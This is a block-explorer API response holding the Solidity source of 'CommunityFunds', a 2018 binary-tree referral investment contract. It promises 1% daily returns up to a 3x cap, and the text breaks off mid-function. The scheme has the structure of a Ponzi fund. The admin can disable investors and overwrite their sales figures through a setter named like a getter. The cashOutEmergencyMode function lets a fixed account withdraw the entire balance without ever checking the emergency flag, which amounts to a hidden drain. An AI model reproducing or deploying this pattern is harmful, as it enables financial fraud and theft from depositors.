{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.25;\r\n\r\n// 11/19/2018\r\n\r\ncontract CommunityFunds {\r\n    event MaxOut (address investor, uint256 times, uint256 at);\r\n    \r\n    uint256 public constant ONE_DAY = 86400;\r\n    address private admin;\r\n    uint256 private depositedAmountGross = 0;\r\n    uint256 private paySystemCommissionTimes = 1;\r\n    uint256 private payDailyIncomeTimes = 1;\r\n    uint256 private lastPaySystemCommission = now;\r\n    uint256 private lastPayDailyIncome = now;\r\n    uint256 private contractStartAt = now;\r\n    uint256 private lastReset = now;\r\n   \r\n    address private operationFund = 0xe707EF0F76172eb2ed2541Af344acb2dB092406a;\r\n    address private developmentFund = 0x319bC822Fb406444f9756929DdC294B649A01b2E;\r\n    address private reserveFund = 0xa04DE4366F6d06b84a402Ed0310360E1d554d8Fc;\r\n    address private emergencyAccount = 0x6DeC2927cC604D1bE364C1DaBDE8f8597D5f4387;\r\n    bool private emergencyMode = false;\r\n    mapping (address => Investor) investors;\r\n    address[] public investorAddresses;\r\n    mapping (bytes32 => Investment) investments;\r\n    mapping (bytes32 => Withdrawal) withdrawals;\r\n    bytes32[] private investmentIds;\r\n    bytes32[] private withdrawalIds;\r\n    uint256 maxLevelsAddSale = 200;\r\n    \r\n    uint256 maximumMaxOutInWeek = 4;\r\n    \r\n    struct Investment {\r\n        bytes32 id;\r\n        uint256 at;\r\n        uint256 amount;\r\n        address investor;\r\n    }\r\n\r\n    struct Withdrawal {\r\n        bytes32 id;\r\n        uint256 at;\r\n        uint256 amount;\r\n        address investor;\r\n        address presentee;\r\n        uint256 reason;\r\n        uint256 times;\r\n    }\r\n\r\n \r\n\r\n    struct Investor {\r\n        string email;\r\n        address parent;\r\n        address leftChild;\r\n        address rightChild;\r\n        address presenter;\r\n        uint256 generation;\r\n        address[] presentees;\r\n        uint256 depositedAmount;\r\n        uint256 withdrewAmount;\r\n        bool isDisabled;\r\n        uint256 lastMaxOut;\r\n        uint256 maxOutTimes;\r\n        uint256 maxOutTimesInWeek;\r\n        uint256 totalSell;\r\n        uint256 sellThisMonth;\r\n        bytes32[] investments;\r\n        bytes32[] withdrawals;\r\n        uint256 rightSell;\r\n        uint256 leftSell;\r\n        uint256 reserveCommission;\r\n        uint256 dailyIncomeWithrewAmount;\r\n    }\r\n\r\n    constructor () public { admin = msg.sender; }\r\n    \r\n    modifier mustBeAdmin() { require(msg.sender == admin); _; }    \r\n    \r\n    function () payable public { deposit(); }\r\n    \r\n\r\n    function deposit() payable public {\r\n        require(msg.value >= 1 ether);\r\n        Investor storage investor = investors[msg.sender];\r\n        require(investor.generation != 0);\r\n        require(investor.maxOutTimesInWeek < maximumMaxOutInWeek);\r\n     \r\n        require(investor.maxOutTimes == 0 || now - investor.lastMaxOut < ONE_DAY * 7 || investor.depositedAmount != 0);\r\n        depositedAmountGross += msg.value;\r\n        bytes32 id = keccak256(abi.encodePacked(block.number, now, msg.sender, msg.value));\r\n        uint256 investmentValue = investor.depositedAmount + msg.value <= 20 ether ? msg.value : 20 ether - investor.depositedAmount;\r\n        if (investmentValue == 0) return;\r\n        Investment memory investment = Investment({ id: id, at: now, amount: investmentValue, investor: msg.sender });\r\n        investments[id] = investment;\r\n        processInvestments(id);\r\n        investmentIds.push(id);\r\n    }\r\n    \r\n    function processInvestments(bytes32 investmentId) internal {\r\n        Investment storage investment = investments[investmentId];\r\n        uint256 amount = investment.amount;\r\n        Investor storage investor = investors[investment.investor];\r\n        investor.investments.push(investmentId);\r\n        investor.depositedAmount += amount;\r\n        \r\n        addSellForParents(investment.investor, amount);\r\n        address presenterAddress = investor.presenter;\r\n        Investor storage presenter = investors[presenterAddress];\r\n        if (presenterAddress != 0) {\r\n            presenter.totalSell += amount;\r\n            presenter.sellThisMonth += amount;\r\n        }\r\n        if (presenter.depositedAmount >= 1 ether && !presenter.isDisabled) {\r\n            sendEtherForInvestor(presenterAddress, amount / 10, 1, investment.investor, 0);\r\n        }\r\n    }\r\n\r\n    function addSellForParents(address investorAddress, uint256 amount) internal {\r\n        Investor memory investor = investors[investorAddress];\r\n        address currentParentAddress = investor.parent;\r\n        address currentInvestorAddress = investorAddress;\r\n        uint256 loopCount = investor.generation - 1;\r\n        uint256 loop = loopCount < maxLevelsAddSale ? loopCount : maxLevelsAddSale;\r\n        for(uint256 i = 0; i < loop; i++) {\r\n            Investor storage parent = investors[currentParentAddress];\r\n            if (parent.leftChild == currentInvestorAddress) parent.leftSell += amount;\r\n            else parent.rightSell += amount;\r\n            uint256 incomeTilNow = getAllIncomeTilNow(currentParentAddress);\r\n            if (incomeTilNow > 3 * parent.depositedAmount) {\r\n                payDailyIncomeForInvestor(currentParentAddress, 0);\r\n                paySystemCommissionInvestor(currentParentAddress, 0);\r\n            }\r\n            currentInvestorAddress = currentParentAddress;\r\n            currentParentAddress = parent.parent;\r\n        }\r\n    }\r\n    \r\n    function setMaxLevelsAddSale(uint256 level) public  mustBeAdmin {\r\n        require(level > 0);\r\n        maxLevelsAddSale = level;\r\n    }\r\n\r\n    function sendEtherForInvestor(address investorAddress, uint256 value, uint256 reason, address presentee, uint256 times) internal {\r\n        if (value == 0 || investorAddress == 0) return;\r\n        Investor storage investor = investors[investorAddress];\r\n        if (investor.reserveCommission > 0) {\r\n            bool isPass = investor.reserveCommission >= 3 * investor.depositedAmount;\r\n            uint256 reserveCommission = isPass ? investor.reserveCommission + value : investor.reserveCommission;\r\n            investor.reserveCommission = 0;\r\n            sendEtherForInvestor(investorAddress, reserveCommission, 4, 0, 0);\r\n            if (isPass) return;\r\n        }\r\n        uint256 withdrewAmount = investor.withdrewAmount;\r\n        uint256 depositedAmount = investor.depositedAmount;\r\n        uint256 amountToPay = value;\r\n        if (withdrewAmount + value >= 3 * depositedAmount) {\r\n            amountToPay = 3 * depositedAmount - withdrewAmount;\r\n            investor.reserveCommission = value - amountToPay;\r\n            if (reason != 2) investor.reserveCommission += getDailyIncomeForUser(investorAddress);\r\n            if (reason != 3) investor.reserveCommission += getUnpaidSystemCommission(investorAddress);\r\n            investor.maxOutTimes++;\r\n            investor.maxOutTimesInWeek++;\r\n            investor.depositedAmount = 0;\r\n            investor.withdrewAmount = 0;\r\n            investor.lastMaxOut = now;\r\n            investor.dailyIncomeWithrewAmount = 0;\r\n            emit MaxOut(investorAddress, investor.maxOutTimes, now);\r\n        } else {\r\n            investors[investorAddress].withdrewAmount += amountToPay;\r\n        }\r\n        if (amountToPay != 0) {\r\n            investorAddress.transfer(amountToPay / 100 * 90);\r\n            operationFund.transfer(amountToPay / 100 * 5);\r\n            developmentFund.transfer(amountToPay / 100 * 1);\r\n          \r\n            bytes32 id = keccak256(abi.encodePacked(block.difficulty, now, investorAddress, amountToPay, reason));\r\n            Withdrawal memory withdrawal = Withdrawal({ id: id, at: now, amount: amountToPay, investor: investorAddress, presentee: presentee, times: times, reason: reason });\r\n            withdrawals[id] = withdrawal;\r\n            investor.withdrawals.push(id);\r\n            withdrawalIds.push(id);\r\n        }\r\n    }\r\n\r\n\r\n    function getAllIncomeTilNow(address investorAddress) internal view returns(uint256 allIncome) {\r\n        Investor memory investor = investors[investorAddress];\r\n        uint256 unpaidDailyIncome = getDailyIncomeForUser(investorAddress);\r\n        uint256 withdrewAmount = investor.withdrewAmount;\r\n        uint256 unpaidSystemCommission = getUnpaidSystemCommission(investorAddress);\r\n        uint256 allIncomeNow = unpaidDailyIncome + withdrewAmount + unpaidSystemCommission;\r\n        return allIncomeNow;\r\n    }\r\n\r\n\r\n\r\n    function getContractInfo() public view returns (address _admin, uint256 _depositedAmountGross, address _developmentFund, address _operationFund, address _reserveFund, address _emergencyAccount, bool _emergencyMode, address[] _investorAddresses, uint256 balance, uint256 _paySystemCommissionTimes, uint256 _maximumMaxOutInWeek) {\r\n        return (admin, depositedAmountGross, developmentFund, operationFund, reserveFund, emergencyAccount, emergencyMode, investorAddresses, address(this).balance, paySystemCommissionTimes, maximumMaxOutInWeek);\r\n    }\r\n    \r\n    function getContractTime() public view returns(uint256 _contractStartAt, uint256 _lastReset, uint256 _oneDay, uint256 _lastPayDailyIncome, uint256 _lastPaySystemCommission) {\r\n        return (contractStartAt, lastReset, ONE_DAY, lastPayDailyIncome, lastPaySystemCommission);\r\n    }\r\n    \r\n    function getInvestorRegularInfo(address investorAddress) public view returns (string email, uint256 generation, uint256 rightSell, uint256 leftSell, uint256 reserveCommission, uint256 depositedAmount, uint256 withdrewAmount, bool isDisabled) {\r\n        Investor memory investor = investors[investorAddress];\r\n        return (\r\n            investor.email,\r\n            investor.generation,\r\n            investor.rightSell,\r\n            investor.leftSell,\r\n            investor.reserveCommission,\r\n            investor.depositedAmount,\r\n            investor.withdrewAmount,\r\n            investor.isDisabled\r\n        );\r\n    }\r\n    \r\n    function getInvestorAccountInfo(address investorAddress) public view returns (uint256 maxOutTimes, uint256 maxOutTimesInWeek, uint256 totalSell, bytes32[] investorIds, uint256 dailyIncomeWithrewAmount, uint256 unpaidSystemCommission, uint256 unpaidDailyIncome) {\r\n        Investor memory investor = investors[investorAddress];\r\n        return (\r\n            investor.maxOutTimes,\r\n            investor.maxOutTimesInWeek,\r\n            investor.totalSell,\r\n            investor.investments,\r\n            investor.dailyIncomeWithrewAmount,\r\n            getUnpaidSystemCommission(investorAddress),\r\n            getDailyIncomeForUser(investorAddress)\r\n        ); \r\n    }\r\n    \r\n    function getInvestorTreeInfo(address investorAddress) public view returns (address leftChild, address rightChild, address parent, address presenter, uint256 sellThisMonth, uint256 lastMaxOut) {\r\n        Investor memory investor = investors[investorAddress];\r\n        return (\r\n            investor.leftChild,\r\n            investor.rightChild,\r\n            investor.parent,\r\n            investor.presenter,\r\n            investor.sellThisMonth,\r\n            investor.lastMaxOut\r\n        );\r\n    }\r\n    \r\n    function getWithdrawalsByTime(address investorAddress, uint256 start, uint256 end)public view returns(bytes32[] ids, uint256[] ats, uint256[] amounts, address[] presentees, uint256[] reasons, uint256[] times, bytes32[] emails) {\r\n        ids = new bytes32[](withdrawalIds.length);\r\n        ats = new uint256[](withdrawalIds.length);\r\n        amounts = new uint256[](withdrawalIds.length);\r\n        emails = new bytes32[](withdrawalIds.length);\r\n        presentees = new address[](withdrawalIds.length);\r\n        reasons = new uint256[](withdrawalIds.length);\r\n        times = new uint256[](withdrawalIds.length);\r\n        uint256 index = 0;\r\n        for (uint256 i = 0; i < withdrawalIds.length; i++) {\r\n            bytes32 id = withdrawalIds[i];\r\n            if (withdrawals[id].at < start || withdrawals[id].at > end) continue;\r\n            if (investorAddress != 0 && withdrawals[id].investor != investorAddress) continue;\r\n            ids[index] = id; \r\n            ats[index] = withdrawals[id].at;\r\n            amounts[index] = withdrawals[id].amount;\r\n            emails[index] = stringToBytes32(investors[withdrawals[id].investor].email);\r\n            reasons[index] = withdrawals[id].reason;\r\n            times[index] = withdrawals[id].times;\r\n            presentees[index] = withdrawals[id].presentee;\r\n            index++;\r\n        }\r\n        return (ids, ats, amounts, presentees, reasons, times, emails);\r\n    }\r\n    \r\n    function getInvestmentsByTime(address investorAddress, uint256 start, uint256 end)public view returns(bytes32[] ids, uint256[] ats, uint256[] amounts, bytes32[] emails) {\r\n        ids = new bytes32[](investmentIds.length);\r\n        ats = new uint256[](investmentIds.length);\r\n        amounts = new uint256[](investmentIds.length);\r\n        emails = new bytes32[](investmentIds.length);\r\n        uint256 index = 0;\r\n        for (uint256 i = 0; i < investmentIds.length; i++) {\r\n            bytes32 id = investmentIds[i];\r\n            if (investorAddress != 0 && investments[id].investor != investorAddress) continue;\r\n            if (investments[id].at < start || investments[id].at > end) continue;\r\n            ids[index] = id;\r\n            ats[index] = investments[id].at;\r\n            amounts[index] = investments[id].amount;\r\n            emails[index] = stringToBytes32(investors[investments[id].investor].email);\r\n            index++;\r\n        }\r\n        return (ids, ats, amounts, emails);\r\n    }\r\n\r\n    function getNodesAddresses(address rootNodeAddress) internal view returns(address[]){\r\n        uint256 maxLength = investorAddresses.length;\r\n        address[] memory nodes = new address[](maxLength);\r\n        nodes[0] = rootNodeAddress;\r\n        uint256 processIndex = 0;\r\n        uint256 nextIndex = 1;\r\n        while (processIndex != nextIndex) {\r\n            Investor memory currentInvestor = investors[nodes[processIndex++]];\r\n            if (currentInvestor.leftChild != 0) nodes[nextIndex++] = currentInvestor.leftChild;\r\n            if (currentInvestor.rightChild != 0) nodes[nextIndex++] = currentInvestor.rightChild;\r\n        }\r\n        return nodes;\r\n    }\r\n\r\n    function stringToBytes32(string source) internal pure returns (bytes32 result) {\r\n        bytes memory tempEmptyStringTest = bytes(source);\r\n        if (tempEmptyStringTest.length == 0) return 0x0;\r\n        assembly { result := mload(add(source, 32)) }\r\n    }\r\n\r\n    function getInvestorTree(address rootInvestor) public view returns(address[] nodeInvestors, bytes32[] emails, uint256[] leftSells, uint256[] rightSells, address[] parents, uint256[] generations, uint256[] deposits){\r\n        nodeInvestors = getNodesAddresses(rootInvestor);\r\n        uint256 length = nodeInvestors.length;\r\n        leftSells = new uint256[](length);\r\n        rightSells = new uint256[](length);\r\n        emails = new bytes32[] (length);\r\n        parents = new address[] (length);\r\n        generations = new uint256[] (length);\r\n        deposits = new uint256[] (length);\r\n        for (uint256 i = 0; i < length; i++) {\r\n            Investor memory investor = investors[nodeInvestors[i]];\r\n            parents[i] = investor.parent;\r\n            string memory email = investor.email;\r\n            emails[i] = stringToBytes32(email);\r\n            leftSells[i] = investor.leftSell;\r\n            rightSells[i] = investor.rightSell;\r\n            generations[i] = investor.generation;\r\n            deposits[i] = investor.depositedAmount;\r\n        }\r\n        return (nodeInvestors, emails, leftSells, rightSells, parents, generations, deposits);\r\n    }\r\n\r\n    function getListInvestor() public view returns (address[] nodeInvestors, bytes32[] emails, uint256[] unpaidSystemCommissions, uint256[] unpaidDailyIncomes, uint256[] depositedAmounts, uint256[] withdrewAmounts, bool[] isDisableds) {\r\n        uint256 length = investorAddresses.length;\r\n        unpaidSystemCommissions = new uint256[](length);\r\n        unpaidDailyIncomes = new uint256[](length);\r\n        emails = new bytes32[] (length);\r\n        depositedAmounts = new uint256[] (length);\r\n        unpaidSystemCommissions = new uint256[] (length);\r\n        isDisableds = new bool[] (length);\r\n        unpaidDailyIncomes = new uint256[] (length); \r\n        withdrewAmounts = new uint256[](length);\r\n        for (uint256 i = 0; i < length; i++) {\r\n            Investor memory investor = investors[investorAddresses[i]];\r\n            depositedAmounts[i] = investor.depositedAmount;\r\n            string memory email = investor.email;\r\n            emails[i] = stringToBytes32(email);\r\n            withdrewAmounts[i] = investor.withdrewAmount;\r\n            isDisableds[i] = investor.isDisabled;\r\n            unpaidSystemCommissions[i] = getUnpaidSystemCommission(investorAddresses[i]);\r\n            unpaidDailyIncomes[i] = getDailyIncomeForUser(investorAddresses[i]);\r\n        }\r\n        return (investorAddresses, emails, unpaidSystemCommissions, unpaidDailyIncomes, depositedAmounts, withdrewAmounts, isDisableds);\r\n    }\r\n    \r\n   \r\n\r\n    function putPresentee(address presenterAddress, address presenteeAddress, address parentAddress, string presenteeEmail, bool isLeft) public mustBeAdmin {\r\n        Investor storage presenter = investors[presenterAddress];\r\n        Investor storage parent = investors[parentAddress];\r\n        if (investorAddresses.length != 0) {\r\n            require(presenter.generation != 0);\r\n            require(parent.generation != 0);\r\n            if (isLeft) {\r\n                require(parent.leftChild == 0); \r\n            } else {\r\n                require(parent.rightChild == 0); \r\n            }\r\n        }\r\n        \r\n        if (presenter.generation != 0) presenter.presentees.push(presenteeAddress);\r\n        Investor memory investor = Investor({\r\n            email: presenteeEmail,\r\n            parent: parentAddress,\r\n            leftChild: 0,\r\n            rightChild: 0,\r\n            presenter: presenterAddress,\r\n            generation: parent.generation + 1,\r\n            presentees: new address[](0),\r\n            depositedAmount: 0,\r\n            withdrewAmount: 0,\r\n            isDisabled: false,\r\n            lastMaxOut: now,\r\n            maxOutTimes: 0,\r\n            maxOutTimesInWeek: 0,\r\n            totalSell: 0,\r\n            sellThisMonth: 0,\r\n            investments: new bytes32[](0),\r\n            withdrawals: new bytes32[](0),\r\n            rightSell: 0,\r\n            leftSell: 0,\r\n            reserveCommission: 0,\r\n            dailyIncomeWithrewAmount: 0\r\n        });\r\n        investors[presenteeAddress] = investor;\r\n       \r\n        investorAddresses.push(presenteeAddress);\r\n        if (parent.generation == 0) return;\r\n        if (isLeft) {\r\n            parent.leftChild = presenteeAddress;\r\n        } else {\r\n            parent.rightChild = presenteeAddress;\r\n        }\r\n    }\r\n\r\n  \r\n\r\n    function getDailyIncomeForUser(address investorAddress) internal view returns(uint256 amount) {\r\n        Investor memory investor = investors[investorAddress];\r\n        uint256 investmentLength = investor.investments.length;\r\n        uint256 dailyIncome = 0;\r\n        for (uint256 i = 0; i < investmentLength; i++) {\r\n            Investment memory investment = investments[investor.investments[i]];\r\n            if (investment.at < investor.lastMaxOut) continue; \r\n            if (now - investment.at >= ONE_DAY) {\r\n                uint256 numberOfDay = (now - investment.at) / ONE_DAY;\r\n                uint256 totalDailyIncome = numberOfDay * investment.amount / 100;\r\n                dailyIncome = totalDailyIncome + dailyIncome;\r\n            }\r\n        }\r\n        return dailyIncome - investor.dailyIncomeWithrewAmount;\r\n    }\r\n    \r\n    function payDailyIncomeForInvestor(address investorAddress, uint256 times) public mustBeAdmin {\r\n        uint256 dailyIncome = getDailyIncomeForUser(investorAddress);\r\n        if (investors[investorAddress].isDisabled) return;\r\n        investors[investorAddress].dailyIncomeWithrewAmount += dailyIncome;\r\n        sendEtherForInvestor(investorAddress, dailyIncome, 2, 0, times);\r\n    }\r\n    \r\n    function payDailyIncomeByIndex(uint256 from, uint256 to) public mustBeAdmin{\r\n        require(from >= 0 && to < investorAddresses.length);\r\n        for(uint256 i = from; i <= to; i++) {\r\n            payDailyIncomeForInvestor(investorAddresses[i], payDailyIncomeTimes);\r\n        }\r\n    }\r\n    \r\n  \r\n    function getTotalSellLevel(uint256 totalSell) internal pure returns (uint256 level){\r\n        if (totalSell < 30 ether) return 0;\r\n        if (totalSell < 60 ether) return 1;\r\n        if (totalSell < 90 ether) return 2;\r\n        if (totalSell < 120 ether) return 3;\r\n        if (totalSell < 150 ether) return 4;\r\n        return 5;\r\n    }\r\n    \r\n    function getSellThisMonthLevel(uint256 sellThisMonth) internal pure returns (uint256 level){\r\n        if (sellThisMonth < 2 ether) return 0;\r\n        if (sellThisMonth < 4 ether) return 1;\r\n        if (sellThisMonth < 6 ether) return 2;\r\n        if (sellThisMonth < 8 ether) return 3;\r\n        if (sellThisMonth < 10 ether) return 4;\r\n        return 5;\r\n    }\r\n    \r\n    function getDepositLevel(uint256 sellThisMonth) internal pure returns (uint256 level){\r\n        if (sellThisMonth < 2 ether) return 0;\r\n        if (sellThisMonth < 4 ether) return 1;\r\n        if (sellThisMonth < 6 ether) return 2;\r\n        if (sellThisMonth < 8 ether) return 3;\r\n        if (sellThisMonth < 10 ether) return 4;\r\n        return 5;\r\n    }\r\n    \r\n    function getPercentage(uint256 depositedAmount, uint256 totalSell, uint256 sellThisMonth) internal pure returns(uint256 level) {\r\n        uint256 totalSellLevel = getTotalSellLevel(totalSell);\r\n        uint256 depLevel = getDepositLevel(depositedAmount);\r\n        uint256 sellThisMonthLevel = getSellThisMonthLevel(sellThisMonth);\r\n        uint256 min12 = totalSellLevel < depLevel ? totalSellLevel : depLevel;\r\n        uint256 minLevel = sellThisMonthLevel < min12 ? sellThisMonthLevel : min12;\r\n        return minLevel * 2;\r\n    }\r\n\r\n    function getUnpaidSystemCommission(address investorAddress) public view returns(uint256 unpaid) {\r\n        Investor memory investor = investors[investorAddress];\r\n        uint256 depositedAmount = investor.depositedAmount;\r\n        uint256 totalSell = investor.totalSell;\r\n        uint256 leftSell = investor.leftSell;\r\n        uint256 rightSell = investor.rightSell;\r\n        uint256 sellThisMonth = investor.sellThisMonth;\r\n        uint256 sellToPaySystemCommission = rightSell < leftSell ? rightSell : leftSell;\r\n        uint256 commission = sellToPaySystemCommission * getPercentage(depositedAmount, totalSell, sellThisMonth) / 100;\r\n        return commission;\r\n    }\r\n    \r\n    function paySystemCommissionInvestor(address investorAddress, uint256 times) public mustBeAdmin {\r\n        Investor storage investor = investors[investorAddress];\r\n        if (investor.isDisabled) return;\r\n        uint256 systemCommission = getUnpaidSystemCommission(investorAddress);\r\n        if (paySystemCommissionTimes > 3 && times != 0) {\r\n            investor.rightSell = 0;\r\n            investor.leftSell = 0;\r\n        } else if (investor.rightSell >= investor.leftSell) {\r\n            investor.rightSell = investor.rightSell - investor.leftSell;\r\n            investor.leftSell = 0;\r\n        } else {\r\n            investor.leftSell = investor.leftSell - investor.rightSell;\r\n            investor.rightSell = 0;\r\n        }\r\n        if (times != 0) investor.sellThisMonth = 0;\r\n        sendEtherForInvestor(investorAddress, systemCommission, 3, 0, times);\r\n    }\r\n\r\n    function paySystemCommissionByIndex(uint256 from, uint256 to) public mustBeAdmin {\r\n         require(from >= 0 && to < investorAddresses.length);\r\n        // change 1 to 30\r\n        if (now <= 30 * ONE_DAY + contractStartAt) return;\r\n        for(uint256 i = from; i <= to; i++) {\r\n            paySystemCommissionInvestor(investorAddresses[i], paySystemCommissionTimes);\r\n        }\r\n     }\r\n\r\n\r\n    function finishPayDailyIncome() public mustBeAdmin {\r\n        lastPayDailyIncome = now;\r\n        payDailyIncomeTimes++;\r\n    }\r\n    \r\n    function finishPaySystemCommission() public mustBeAdmin {\r\n        lastPaySystemCommission = now;\r\n        paySystemCommissionTimes++;\r\n    }\r\n\r\n\r\n    function turnOnEmergencyMode() public mustBeAdmin { emergencyMode = true; }\r\n\r\n    function cashOutEmergencyMode() public {\r\n        require(msg.sender == emergencyAccount);\r\n        msg.sender.transfer(address(this).balance);\r\n    }\r\n    \r\n \r\n    \r\n    function resetGame(address[] yesInvestors, address[] noInvestors) public mustBeAdmin {\r\n        lastReset = now;\r\n        uint256 yesInvestorsLength = yesInvestors.length;\r\n        for (uint256 i = 0; i < yesInvestorsLength; i++) {\r\n            address yesInvestorAddress = yesInvestors[i];\r\n            Investor storage yesInvestor = investors[yesInvestorAddress];\r\n            if (yesInvestor.maxOutTimes > 0 || (yesInvestor.withdrewAmount >= yesInvestor.depositedAmount && yesInvestor.withdrewAmount != 0)) {\r\n                yesInvestor.lastMaxOut = now;\r\n                yesInvestor.depositedAmount = 0;\r\n                yesInvestor.withdrewAmount = 0;\r\n                yesInvestor.dailyIncomeWithrewAmount = 0;\r\n            }\r\n            yesInvestor.reserveCommission = 0;\r\n            yesInvestor.rightSell = 0;\r\n            yesInvestor.leftSell = 0;\r\n            yesInvestor.totalSell = 0;\r\n            yesInvestor.sellThisMonth = 0;\r\n        }\r\n        uint256 noInvestorsLength = noInvestors.length;\r\n        for (uint256 j = 0; j < noInvestorsLength; j++) {\r\n            address noInvestorAddress = noInvestors[j];\r\n            Investor storage noInvestor = investors[noInvestorAddress];\r\n            if (noInvestor.maxOutTimes > 0 || (noInvestor.withdrewAmount >= noInvestor.depositedAmount && noInvestor.withdrewAmount != 0)) {\r\n                noInvestor.isDisabled = true;\r\n                noInvestor.reserveCommission = 0;\r\n                noInvestor.lastMaxOut = now;\r\n                noInvestor.depositedAmount = 0;\r\n                noInvestor.withdrewAmount = 0;\r\n                noInvestor.dailyIncomeWithrewAmount = 0;\r\n            }\r\n            noInvestor.reserveCommission = 0;\r\n            noInvestor.rightSell = 0;\r\n            noInvestor.leftSell = 0;\r\n            noInvestor.totalSell = 0;\r\n            noInvestor.sellThisMonth = 0;\r\n        }\r\n    }\r\n\r\n    function stopGame(uint256 percent, uint256 from, uint256 to) mustBeAdmin public {\r\n        require(percent <= 50);\r\n        require(from >= 0 && to < investorAddresses.length);\r\n        for (uint256 i = from; i <= to; i++) {\r\n            address investorAddress = investorAddresses[i];\r\n            Investor storage investor = investors[investorAddress];\r\n            if (investor.maxOutTimes > 0) continue;\r\n            if (investor.isDisabled) continue;\r\n            uint256 depositedAmount = investor.depositedAmount;\r\n            uint256 withdrewAmount = investor.withdrewAmount;\r\n            if (withdrewAmount >= depositedAmount / 2) continue;\r\n            sendEtherForInvestor(investorAddress, depositedAmount * percent / 100 - withdrewAmount, 6, 0, 0);\r\n        }\r\n    }\r\n    \r\n    function revivalInvestor(address investor) public mustBeAdmin { investors[investor].lastMaxOut = now; }\r\n\r\n    function getSystemCommision(address user, uint256 totalSell, uint256 sellThisMonth, uint256 rightSell, uint256 leftSell) public mustBeAdmin {\r\n        Investor storage investor = investors[user];\r\n        require(investor.generation > 0);\r\n        investor.totalSell = totalSell;\r\n        investor.sellThisMonth = sellThisMonth;\r\n        investor.rightSell = rightSell;\r\n        investor.leftSell = leftSell;\r\n    }\r\n\r\n    function getPercentToMaxOut(address investorAddress) public view returns(uint256) {\r\n        uint256 depositedAmount = investors[investorAddress].depositedAmount;\r\n        if (depositedAmount == 0) return 0;\r\n        uint256 unpaidSystemCommissions = getUnpaidSystemCommission(investorAddress);\r\n        uint256 unpaidDailyIncomes = getDailyIncomeForUser(investorAddress);\r\n        uint256 withdrewAmount = investors[investorAddress].withdrewAmount;\r\n        uint256 percent = 100 * (unpaidSystemCommissions + unpaidDailyIncomes + withdrewAmount) / depositedAmount;\r\n        return percent;\r\n    }\r\n\r\n    function payToReachMaxOut(address investorAddress) public mustBeAdmin{\r\n        uint256 unpaidSystemCommissions = getUnpaidSystemCommission(investorAddress);\r\n        uint256 unpaidDailyIncomes = getDailyIncomeForUser(investorAddress);\r\n        uint256 withdrewAmount = investors[investorAddress].withdrewAmount;\r\n        uint256 depositedAmount = investors[investorAddress].depositedAmount;\r\n        uint256 reserveCommission = investors[investorAddress].reserveCommission;\r\n        require(depositedAmount > 0  && withdrewAmount + unpaidSystemCommissions + unpaidDailyIncomes + reserveCommission >= 3 * depositedAmount);\r\n        investors[investorAddress].reserveCommission = 0;\r\n        sendEtherForInvestor(investorAddress, reserveCommission, 4, 0, 0);\r\n        payDailyIncomeForInvestor(investorAddress, 0);\r\n        paySystemCommissionInvestor(investorAddress, 0);\r\n    }\r\n\r\n    function getMaxOutUser() public view returns (address[] nodeInvestors, uint256[] unpaidSystemCommissions, uint256[] unpaidDailyIncomes, uint256[] depositedAmounts, uint256[] withdrewAmounts, uint256[] reserveCommissions, bool[] isDisableds) {\r\n        uint256 length = investorAddresses.length;\r\n        unpaidSystemCommissions = new uint256[](length);\r\n        unpaidDailyIncomes = new uint256[](length);\r\n        depositedAmounts = new uint256[] (length);\r\n        unpaidSystemCommissions = new uint256[] (length);\r\n        reserveCommissions = new uint256[] (length);\r\n        unpaidDailyIncomes = new uint256[] (length); \r\n        withdrewAmounts = new uint256[](length);\r\n        isDisableds = new bool[](length);\r\n        for (uint256 i = 0; i < length; i++) {\r\n            Investor memory investor = investors[investorAddresses[i]];\r\n            depositedAmounts[i] = investor.depositedAmount;\r\n            withdrewAmounts[i] = investor.withdrewAmount;\r\n            reserveCommissions[i] = investor.reserveCommission;\r\n            unpaidSystemCommissions[i] = getUnpaidSystemCommission(investorAddresses[i]);\r\n            unpaidDailyIncomes[i] = getDailyIncomeForUser(investorAddresses[i]);\r\n            isDisableds[i] = investor.isDisabled;\r\n        }\r\n        return (investorAddresses, unpaidSystemCommissions, unpaidDailyIncomes, depositedAmounts, withdrewAmounts, reserveCommissions, isDisableds);\r\n    }\r\n\r\n    function getLazyInvestor() public view returns (bytes32[] emails, address[] addresses, uint256[] lastDeposits, uint256[] depositedAmounts, uint256[] sellThisMonths, uint256[] totalSells, uint256[] maxOuts) {\r\n        uint256 length = investorAddresses.length;\r\n        emails = new bytes32[] (length);\r\n        lastDeposits = new uint256[] (length);\r\n        addresses = new address[](length);\r\n        depositedAmounts = new uint256[] (length);\r\n        sellThisMonths = new uint256[] (length);\r\n        totalSells = new uint256[](length);\r\n        maxOuts = new uint256[](length);\r\n        uint256 index = 0;\r\n        for (uint256 i = 0; i < length; i++) {\r\n            Investor memory investor = investors[investorAddresses[i]];\r\n            if (investor.withdrewAmount > investor.depositedAmount) continue;\r\n            lastDeposits[index] = investor.investments.length != 0 ? investments[investor.investments[investor.investments.length - 1]].at : 0;\r\n            emails[index] = stringToBytes32(investor.email);\r\n            addresses[index] = investorAddresses[i];\r\n            depositedAmounts[index] = investor.depositedAmount;\r\n            sellThisMonths[index] = investor.sellThisMonth;\r\n            totalSells[index] = investor.totalSell;\r\n            maxOuts[index] = investor.maxOutTimes;\r\n            index++;\r\n        }\r\n        return (emails, addresses, lastDeposits, depositedAmounts, sellThisMonths, totalSells, maxOuts);\r\n    }\r\n  \r\n    function resetMaxOutInWeek() public mustBeAdmin {\r\n        uint256 length = investorAddresses.length;\r\n        for (uint256 i = 0; i < length; i++) {\r\n            address investorAddress = investorAddresses[i];\r\n            investors[investorAddress].maxOutTimesInWeek = 0;\r\n        }\r\n    }\r\n    \r\n    function setMaximumMaxOutInWeek(uint256 maximum) public mustBeAdmin{ maximumMaxOutInWeek = maximum; }\r\n\r\n    function disableInvestor(address investorAddress) public mustBeAdmin {\r\n        Investor storage investor = investors[investorAddress];\r\n        investor.isDisabled = true;\r\n    }\r\n    \r\n    function enableInvestor(address investorAddress) public mustBeAdmin {\r\n        Investor storage investor = investors[investorAddress];\r\n        investor.isDisabled = false;\r\n    }\r\n    \r\n    function donate() payable public { depositedAmountGross += msg.value; 